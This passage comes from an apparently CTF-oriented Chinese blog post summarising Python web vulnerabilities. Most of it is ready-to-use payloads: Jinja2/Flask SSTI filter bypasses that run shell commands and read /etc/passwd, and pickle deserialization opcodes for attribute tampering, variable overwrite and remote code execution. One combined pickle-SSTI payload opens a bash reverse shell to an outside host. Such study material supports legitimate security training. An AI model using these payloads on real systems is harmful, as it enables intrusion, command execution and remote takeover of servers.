<pre tabindex="0"><code>{{().__class__.__bases__[0].__subclasses__()[146].__init__.__globals__[request.values.a][request.values.b](request.values.c).popen(request.values.d).read()}}&amp;a=__builtins__&amp;b=__import__&amp;c=os&amp;d=whoami
</code></pre><p><strong>利用chr()绕过</strong></p>
<p>先获取chr()函数，赋值给chr，后面再拼接成一个字符串</p>
<pre tabindex="0"><code>{% set
chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr
%}{{
().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()
}}
</code></pre><h4 id="下划线__">下划线__</h4>
<p><strong>利用request对象绕过,同上</strong></p>
<h4 id="点">点</h4>
<p><strong>利用 <code>|attr()</code> 绕过（实用）</strong></p>
<p>如果 <code>.</code> 也被过滤，且目标是JinJa2（flask）的话，可以使用原生JinJa2函数<code>attr()</code>，即：</p>
<pre tabindex="0"><code>().__class__   =&gt;  ()|attr(&#34;__class__&#34;)
</code></pre><p>示例：</p>
<pre tabindex="0"><code>{{()|attr(&#34;__class__&#34;)|attr(&#34;__base__&#34;)|attr(&#34;__subclasses__&#34;)()|attr(&#34;__getitem__&#34;)(146)|attr(&#34;__init__&#34;)|attr(&#34;__globals__&#34;)|attr(&#34;__getitem__&#34;)(&#39;__builtins__&#39;)|attr(&#34;__getitem__&#34;)(&#39;__import__&#39;)(&#34;os&#34;)|attr(&#34;popen&#34;)(&#34;whoami&#34;)|attr(&#34;read&#34;)()}}

{{().__class__.__bases__[0].__subclasses__()[146].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;whoami&#39;).read()}}
</code></pre><p><strong>利用中括号[ ]绕过</strong></p>
<pre tabindex="0"><code>{{&#39;&#39;[&#39;__class__&#39;][&#39;__bases__&#39;][0][&#39;__subclasses__&#39;]()[146][&#39;__init__&#39;][&#39;__globals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls&#34;).read()&#39;)}}
</code></pre><h4 id="过滤了大括号-">过滤了大括号 <code>{{</code></h4>
<p>我们可以用Jinja2的 <code>{%...%}</code> 语句装载一个循环控制语句来绕过：</p>
<pre tabindex="0"><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].eval(&#34;__import__(&#39;os&#39;).popen(&#39;ls /&#39;).read()&#34;)}}{% endif %}{% endfor %}
</code></pre><p>也可以使用 <code>{% if ... %}1{% endif %}</code> 配合 <code>os.popen</code> 和 <code>curl</code> 将执行结果外带（不外带的话无回显）出来：</p>
<pre tabindex="0"><code>{% if &#39;&#39;.__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;ls /&#39; %}1{% endif %}
</code></pre><p>也可以用 <code>{%print(......)%}</code> 的形式来代替 <code>{{</code> ，如下：</p>
<h4 id="过滤中括号引号下划线双大括号">过滤中括号，引号，下划线，双大括号</h4>
<p>没有过滤双大括号</p>
<pre tabindex="0"><code>{{().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;)}}

{{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(146)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)}}&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&#34;os&#34;).popen(&#39;whoami&#39;).read()
</code></pre><p>过滤双大括号</p>
<pre tabindex="0"><code>{%print(()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(146)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9))%}&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&#34;os&#34;).popen(&#39;whoami&#39;).read()
</code></pre><h4 id="更多待更">更多(待更)</h4>
<p>其他姿势可以参考下面大佬们文章(总结真累qwq)：</p>
<p><a href="https://xz.aliyun.com/t/9584#toc-23" target="_blank" rel="noopener noreffer">https://xz.aliyun.com/t/9584#toc-23</a>
</p>
<p><a href="https://lazzzaro.github.io/2020/05/15/web-SSTI/" target="_blank" rel="noopener noreffer">https://lazzzaro.github.io/2020/05/15/web-SSTI/</a>
</p>
<p><a href="https://blog.csdn.net/miuzzx/article/details/110220425" target="_blank" rel="noopener noreffer">https://blog.csdn.net/miuzzx/article/details/110220425</a>
</p>
<h1 id="反序列化">反序列化</h1>
<h2 id="pickle反序列化">pickle反序列化</h2>
<p>参考andynoel师傅的文章(师傅写的对新手很友好):http://www.andynoel.xyz/?m=20221106</p>
<p>视频我就找到一个反序列化过程分析的：https://www.bilibili.com/video/BV1Ar4y1F7Rc/</p>
<h3 id="操纵实例化对象的属性">操纵实例化对象的属性</h3>
<p>假设有如下内容限制用户权限：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self,admin,guest):
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>admin<span style="color:#f92672">=</span>admin
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>guest<span style="color:#f92672">=</span>guest
</span></span></code></pre></div><p>假设正常我们以访客登录时会传入如下 pickle 序列化内容</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self):
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>admin<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>guest<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>u <span style="color:#f92672">=</span> User()
</span></span><span style="display:flex;"><span>print(pickle<span style="color:#f92672">.</span>dumps(u))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># b&#39;\x80\x03c__main__\nUser\nq\x00)\x81q\x01}q\x02(X\x05\x00\x00\x00adminq\x03\x89X\x05\x00\x00\x00guestq\x04\x88ub.&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    0: </span><span style="color:#ae81ff">\x80</span><span style="color:#e6db74"> PROTO      3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    2: c    GLOBAL     &#39;__main__ User&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   17: q    BINPUT     0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   19: )    EMPTY_TUPLE
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   20: </span><span style="color:#ae81ff">\x81</span><span style="color:#e6db74"> NEWOBJ
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   21: q    BINPUT     1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   23: }    EMPTY_DICT
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   24: q    BINPUT     2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   26: (    MARK
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   27: X        BINUNICODE &#39;admin&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   37: q        BINPUT     3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   39: </span><span style="color:#ae81ff">\x89</span><span style="color:#e6db74">     NEWFALSE
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   40: X        BINUNICODE &#39;guest&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   50: q        BINPUT     4
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   52: </span><span style="color:#ae81ff">\x88</span><span style="color:#e6db74">     NEWTRUE
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   53: u        SETITEMS   (MARK at 26)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   54: b    BUILD
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   55: .    STOP
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">highest protocol among opcodes = 2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span></code></pre></div><p>那么我们对登陆时的 <code>\x89</code> <code>\x88</code> 进行调换，即可得到如下实例化结果：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> opcode
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pickletools
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self,admin,guest):
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>admin<span style="color:#f92672">=</span>admin
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>guest<span style="color:#f92672">=</span>guest
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>opcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x80\x03</span><span style="color:#e6db74">c__main__</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">User</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">q</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">)</span><span style="color:#ae81ff">\x81</span><span style="color:#e6db74">q</span><span style="color:#ae81ff">\x01</span><span style="color:#e6db74">}q</span><span style="color:#ae81ff">\x02</span><span style="color:#e6db74">(X</span><span style="color:#ae81ff">\x05\x00\x00\x00</span><span style="color:#e6db74">adminq</span><span style="color:#ae81ff">\x03\x88</span><span style="color:#e6db74">X</span><span style="color:#ae81ff">\x05\x00\x00\x00</span><span style="color:#e6db74">guestq</span><span style="color:#ae81ff">\x04\x89</span><span style="color:#e6db74">ub.&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#pickletools.dis(opcode)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>fakeUser <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>loads(opcode)
</span></span><span style="display:flex;"><span>print(fakeUser<span style="color:#f92672">.</span>admin,fakeUser<span style="color:#f92672">.</span>guest)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># True False</span>
</span></span></code></pre></div><h3 id="变量覆盖">变量覆盖</h3>
<p>我们也可以直接进行变量覆盖，示例</p>
<p>secret.py</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>secret<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;E1gHt&#34;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> secret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;secret:&#34;</span><span style="color:#f92672">+</span>secret<span style="color:#f92672">.</span>secret)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>opcode<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;&#39;c__main__
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">secret
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">(S&#39;secret&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">S&#39;Hacker!!!&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">db.&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>fake<span style="color:#f92672">=</span>pickle<span style="color:#f92672">.</span>loads(opcode)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;fakesecret:&#34;</span><span style="color:#f92672">+</span>fake<span style="color:#f92672">.</span>secret)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>secret:E1gHt
</span></span><span style="display:flex;"><span>fakesecret:Hacker<span style="color:#960050;background-color:#1e0010">!!!</span>
</span></span></code></pre></div><p>用到的 opcode：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>opcode<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;&#39;c__main__
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">secret
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">(S&#39;secret&#39; # secret 内的 secret 属性
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">S&#39;Hacker!!!&#39; # 指定要替换的内容
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">db.&#39;&#39;&#39;</span>  <span style="color:#75715e"># d创建空的dict然后 b 取前一个 Hacker!!! 进行update 这里的具体解释可以看到下面的 b 绕过 R 的部分</span>
</span></span></code></pre></div><h3 id="rce-1">RCE</h3>
<p>在攻击中我们的目的肯定最终是利用序列化的内容实现我们想要实现的操作，这里以RCE为例进行介绍，基本的构造如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>c<span style="color:#f92672">&lt;</span>module<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>callable<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>(<span style="color:#f92672">&lt;</span>args<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>tR
</span></span></code></pre></div><p>填充上内容也就是：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>cos
</span></span><span style="display:flex;"><span>system <span style="color:#75715e">#引入 os 模块的 system 方法，这里实际上是一步将函数添加到 stack 的操作</span>
</span></span><span style="display:flex;"><span>(S<span style="color:#e6db74">&#39;ls&#39;</span> <span style="color:#75715e"># 把当前 stack 存到 metastack，清空 stack，再将 &#39;ls&#39; 压入 stack</span>
</span></span><span style="display:flex;"><span>tR<span style="color:#f92672">.</span> <span style="color:#75715e"># t 也就是将 stack 中的值弹出并转为 tuple，把 metastack 还原到 stack，再将 tuple 压入 stack</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># R 的内容就成为了 system(*(&#39;ls&#39;,)) ，然后 . 代表结束，返回当前栈顶元素</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;=&gt;</span> __import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>system(<span style="color:#f92672">*</span>(<span style="color:#e6db74">&#39;ls&#39;</span>,))
</span></span></code></pre></div><p>这样就是一个最基础的 getshell 的构造</p>
<p>这样的 opcode 被我们 pickle.loads 的话就会导致 RCE</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302061945664.png"
        data-srcset="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302061945664.png, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302061945664.png 1.5x, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302061945664.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302061945664.png"
        title="image" /></p>
<h4 id="r指令rce">R指令RCE</h4>
<pre tabindex="0"><code>opcode=b&#39;&#39;&#39;cos
system
(S&#39;calc&#39;
tR&#39;&#39;&#39;
</code></pre><h4 id="i指令rce">i指令RCE</h4>
<pre tabindex="0"><code>b&#39;&#39;&#39;(S&#34;whoami&#34;
ios
system
.&#39;&#39;&#39;
</code></pre><h4 id="o指令rce">o指令RCE</h4>
<pre tabindex="0"><code>b&#39;&#39;&#39;(cos
system
S&#39;whoami&#39;
o.&#39;&#39;&#39;
</code></pre><h4 id="b指令rce">b指令RCE</h4>
<pre tabindex="0"><code>b&#39;&#39;&#39;c__main__
Student
)\x81}(V__setstate__
cos
system
ubVwhoami
b.&#39;&#39;&#39;

RCE的前提是有Student类

class Student():
    a = &#39;asd&#39;
    b = 123
</code></pre><h3 id="敏感字符bypass">敏感字符bypass</h3>
<h5 id="s"><code>S</code></h5>
<p><code>S</code> 操作码本身是 String ，是支持十六进制的识别的</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>S<span style="color:#e6db74">&#39;flag&#39;</span> <span style="color:#f92672">=&gt;</span> S<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x66\x6c\x61\x67</span><span style="color:#e6db74">&#39;</span>
</span></span></code></pre></div><p><code>V</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>UNICODE        <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;V&#39;</span>   <span style="color:#75715e"># push Unicode string; raw-unicode-escaped&#39;d argument</span>
</span></span></code></pre></div><p>在指令集中存在一个 <code>V</code> 用于操作 Unicode 字符，对原本的 S 进行替换后即可在单引号内使用 Unicode 编码</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>S<span style="color:#e6db74">&#39;flag&#39;</span> <span style="color:#f92672">=&gt;</span> V<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\u0066\u006C\u0061\u0067</span><span style="color:#e6db74">&#39;</span>
</span></span></code></pre></div><h5 id="利用内置函数取关键字">利用内置函数取关键字</h5>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302062046353.png"
        data-srcset="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302062046353.png, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302062046353.png 1.5x, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302062046353.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302062046353.png"
        title="image" /></p>
<p>我们可以用 dir 列出 admin 模块的所有属性，我们需要的 secret 属性位于最后的位置，这个时候我们就可以利用函数将这里的 secret 取出来</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>print(next(reversed(dir(sys<span style="color:#f92672">.</span>modules[<span style="color:#e6db74">&#39;admin&#39;</span>]))))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#secret</span>
</span></span></code></pre></div><p>reversed 函数将 dir 得到的列表逆序，然后使用 next 取第一个即可，写到 opcode 中就是如下构造</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>(((((c__main__
</span></span><span style="display:flex;"><span>admin
</span></span><span style="display:flex;"><span>i__builtin__
</span></span><span style="display:flex;"><span>dir
</span></span><span style="display:flex;"><span>i__builtin__
</span></span><span style="display:flex;"><span>reversed
</span></span><span style="display:flex;"><span>i__builtin__
</span></span><span style="display:flex;"><span>next
</span></span><span style="display:flex;"><span><span style="color:#f92672">.</span>
</span></span></code></pre></div><h4 id="flask-框架下结合-ssti-进行-bypass">flask 框架下结合 SSTI 进行 bypass</h4>
<p>简单放一下 payload，大体的思路就是调用 flask.templating 的 render_template_string 来传入 SSTI 的相关 paylaod</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cflask.templating</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">render_template_string</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">p0</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">(S</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&amp;#123;</span><span style="color:#e6db74">% f</span><span style="color:#e6db74">or x in (().__class__.__base__.__subclasses__()) %&amp;#125;&amp;#123;</span><span style="color:#e6db74">%i</span><span style="color:#e6db74">f x.__name__ ==&#39;catch_warnings&#39;%&amp;#125;&amp;#123;&amp;#123;x.__repr__.im_func.func_globals.linecache.os.system(&#39;bash -c </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">bash -i &gt;&amp; /dev/tcp/172.17.0.1/12345 0&gt;&amp;1</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> &amp;&#39;)&amp;#125;&amp;#125;&amp;#123;</span><span style="color:#e6db74">%e</span><span style="color:#e6db74">ndif%&amp;#125;&amp;#123;</span><span style="color:#e6db74">%e</span><span style="color:#e6db74">ndfor%&amp;#125;</span><span style="color:#ae81ff">\&#34;\n</span><span style="color:#e6db74">p1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">tp2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Rp3</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">.&#34;</span>
</span></span></code></pre></div><h3 id="例题">例题</h3>
<h4 id="强网杯-2022-crash">强网杯 2022 crash</h4>
<h4 id="code-breaking-2018-picklecode">Code-Breaking 2018 picklecode</h4>
<p><a href="https://github.com/phith0n/code-breaking/blob/master/2018/picklecode" target="_blank" rel="noopener noreffer">https://github.com/phith0n/code-breaking/blob/master/2018/picklecode</a>
</p>
<h4 id="sekaictf-2022-bottle-poem">SekaiCTF 2022 Bottle Poem</h4>
<h4 id="美团ctf-2022-ezpickle">美团CTF 2022 ezpickle</h4>
<h2 id="yaml反序列化">yaml反序列化</h2>
<p><a href="https://xz.aliyun.com/t/7923" target="_blank" rel="noopener noreffer">https://xz.aliyun.com/t/7923</a>
</p>
<h1 id="格式化字符串漏洞">格式化字符串漏洞</h1>
<p><a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html" target="_blank" rel="noopener noreffer">https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html</a>
</p>
<p><a href="https://www.freebuf.com/column/232197.html" target="_blank" rel="noopener noreffer">https://www.freebuf.com/column/232197.html</a>
</p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2024-08-20</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://thnpkm.github.io/posts/ctf/python%E6%80%BB%E7%BB%93/" data-title="python总结" data-hashtags="python"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://thnpkm.github.io/posts/ctf/python%E6%80%BB%E7%BB%93/" data-hashtag="python"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://thnpkm.github.io/posts/ctf/python%E6%80%BB%E7%BB%93/" data-title="python总结"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://thnpkm.github.io/posts/ctf/python%E6%80%BB%E7%BB%93/" data-title="python总结"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@6.20.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://thnpkm.github.io/posts/ctf/python%E6%80%BB%E7%BB%93/" data-title="python总结"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/python/">Python</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BAssrf/" class="prev" rel="prev" title="burpsuite靶场ssrf"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>burpsuite靶场ssrf</a>
            <a href="/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" class="next" rel="next" title="nodejs原型链污染">nodejs原型链污染<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
